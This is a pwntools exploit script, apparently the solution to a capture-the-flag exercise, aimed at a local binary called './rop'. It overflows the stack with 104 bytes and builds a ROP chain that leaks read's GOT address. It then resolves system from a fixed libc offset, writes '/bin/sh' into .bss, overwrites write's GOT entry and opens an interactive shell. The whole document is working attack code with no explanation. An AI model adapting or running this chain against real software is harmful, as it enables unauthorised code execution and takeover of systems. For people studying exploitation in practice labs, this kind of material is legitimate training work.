from pwn import *

p = process('./rop')
ELF('./rop')

read_plt = 0x8049030
read_got = 0x804c00c

write_plt = 0x8049050
write_got = 0x804c014

pppr = 0x8049209
system_offset = 0xabcf0
bss = 0x804c020

# Stage 1
payload = 'A'*104
payload += p32(write_plt)
payload += p32(pppr)
payload += p32(1)
payload += p32(read_got)
payload += p32(4)


# Stage 0

payload += p32(read_plt)
payload += p32(pppr)
payload += p32(0)
payload += p32(bss)
payload += p32(8)

payload += p32(read_plt)
payload += p32(pppr)
payload += p32(0)
payload += p32(write_got)
payload += p32(4)

payload += p32(write_plt)
payload += 'A'*4
payload += p32(bss)

log.info('Exploit')
p.send(payload)

read_addr = u32(p.recv()[-4:])
log.info('read_addr = 0x%x' % read_addr)

log.info('system_offset = 0x%x' % system_offset)
system_addr = read_addr - system_offset
log.info('system_addr = 0x%x' % system_addr)

p.send('/bin/sh\x00')
p.send(p32(system_addr))

p.interactive()